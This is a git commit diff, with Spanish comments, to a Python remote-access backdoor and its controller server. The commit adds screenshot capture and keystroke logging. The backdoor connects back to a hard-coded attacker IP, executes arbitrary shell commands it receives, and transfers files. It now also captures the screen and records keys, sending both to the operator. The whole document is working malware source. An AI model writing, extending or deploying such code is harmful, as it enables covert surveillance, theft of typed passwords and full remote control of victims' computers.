7dd36c8de754551e6a9a19f97e0055a768aba43a
Pedro Sotorrío <pesotsan@protonmail.com>
2022-04-08 20:26:39 +0200

    Added screenshot and keylogger commands. keylogger functionality lacks parsing the keylog raw file, expected for next commit

--- payload/backdoor.py
+++ payload/backdoor.py
@@ -3,6 +3,9 @@ import time
 import subprocess
 import json
 import os
+import pyautogui
+#import threading
+import keyboard
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -20,7 +23,7 @@ def reliable_recv():
 
 def connection():
     while True:
-        time.sleep(20)
+        time.sleep(5)
         try:
             #IP de la máquina atacante
             s.connect(('192.168.1.136', 5555))
@@ -49,25 +52,70 @@ def download_file(file_name):
     s.settimeout(None)
     f.close()
 
+
+def take_screenshot():
+    global screenshot_count
+    file_name = 'screenshot' + str(screenshot_count) + '.png'
+    pyautogui.screenshot(file_name)
+    upload_file(file_name)
+    os.remove(file_name)
+    screenshot_count += 1
+
+"""
+def log_keys():
+    global keylogs
+    global keylogger
+    f = open('keylogger' + str(keylogs) + '.txt', 'wb')
+    while keylogger:
+        f.write
+"""
+
+
 def shell():
     while True:
-        command = reliable_recv()
-        if command == 'quit':
+        command = reliable_recv().split()
+        if command[0] == 'quit':
             break
-        elif command[:3] == 'cd ':
-            os.chdir(command[3:])
-        elif command == 'clear':
+        elif command[0] == 'cd':
+            os.chdir(command[1])
+        elif command[0] == 'clear':
             pass
-        elif command[:8] == 'download':
-            upload_file(command[9:])
-        elif command[:6] == 'upload':
-            download_file(command[7:])
+        elif command[0] == 'download':
+            upload_file(command[1])
+        elif command[0] == 'upload':
+            download_file(command[1])
+        elif command[0] == 'screenshot':
+            take_screenshot()
+        elif command[0] == 'keylogger':
+            global keylogger
+            global keylogs
+            #global keylog_thread
+            if not keylogger:
+                keyboard.start_recording()
+                keylogger = True
+                #keylog_thread.start()
+            else:
+                """while keylog_thread.is_alive():
+                    pass"""
+                f = open('keylog' + str(keylogs) + '.txt', 'w')
+                keys = keyboard.stop_recording()
+                for key in keys:
+                    f.write(str(key))
+                f.close()
+                #reliable_send('OK')
+                upload_file('keylog' + str(keylogs) + '.txt')
+                keylogs += 1
+                keylogger = False
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
             result = result.decode()
             reliable_send(result)
 
+screenshot_count = 0
+keylogger = False
+keylogs = 0
+#keylog_thread = threading.Thread(target=log_keys)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
--- payload/server.py
+++ payload/server.py
@@ -19,6 +19,7 @@ def reliable_recv():
 
 
 def download_file(file_name):
+    ret = True
     f = open(file_name, 'wb')
     target.settimeout(1)
     chunk = target.recv(1024)
@@ -27,33 +28,76 @@ def download_file(file_name):
         try:
             chunk = target.recv(1024)
         except socket.timeout as e:
-            break
+            ret = False
     target.settimeout(None)
     f.close()
+    return ret
 
     
 def upload_file(file_name):
     f = open(file_name, 'rb')
     target.send(f.read())
 
+
+def parse_log(file_name):
+    # Por escribir. Método que parsea el archivo crudo recibido del keylogger
+    pass
+
 def target_communication():
     while True:
         command = input('* Shell~%s: ' %str(ip)).lower()
         reliable_send(command)
+        spl_command = command.split()
 
-        if command == 'quit':
+        if spl_command[0] == 'quit':
             break
-        elif command[:3] == 'cd ':
-            pass
-        elif command == 'clear':
+        elif spl_command[0] == 'cd':
+            if len(spl_command) < 2:
+                print("No se ha especficiado un directorio")
+            else:
+                pass
+        elif spl_command[0] == 'clear':
             os.system('clear')
-        elif command[:8] == 'download':
-            download_file(command[9:])
-        elif command[:6] == 'upload':
-            upload_file(command[7:])
+        elif spl_command[0] == 'download':
+            if len(spl_command) < 2:
+                print("No se ha especificado un archivo")
+            else:
+                download_file(spl_command[1])
+        elif spl_command[0] == 'upload':
+            if len(spl_command) < 2:
+                print("No se ha especificado un archivo")
+            else:
+                upload_file(spl_command[1])
+        elif spl_command[0] == 'screenshot':
+            global screenshot_count
+            if download_file('screenshot' + str(screenshot_count) + '.png'):
+                print('Captura de pantalla guardada como screenshot' + str(screenshot_count) + '.png')
+                screenshot_count += 1
+            else:
+                print('Error al recuperar la captura de pantalla')
+        elif spl_command[0] == 'keylogger':
+            global keylogger
+            global keylogs
+            if not keylogger:
+                keylogger = True
+                print('Registrando pulsación de teclas. Vuelve a introducir "keylogger" para detener el registro y recuperarlo como archivo')
+            else:
+                #while not reliable_recv() == 'OK':
+                #    pass
+                # download_file('keylog' + str(keylogs) + '.txt')
+                #print('Registo de teclas guardado como keylog' + str(keylogs) + '.txt')
+                parse_log('keylog' + str(key_logs) + '.txt')
+                keylogger = False
+                keylogs += 1              
         else:
             result = reliable_recv()
             print(result)
+
+        #reliable_send(command)
+
+screenshot_count = 0
+keylogs = 0
+keylogger = False
 
 # AF_INET = IP     SOCK_STREAM = TCP
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
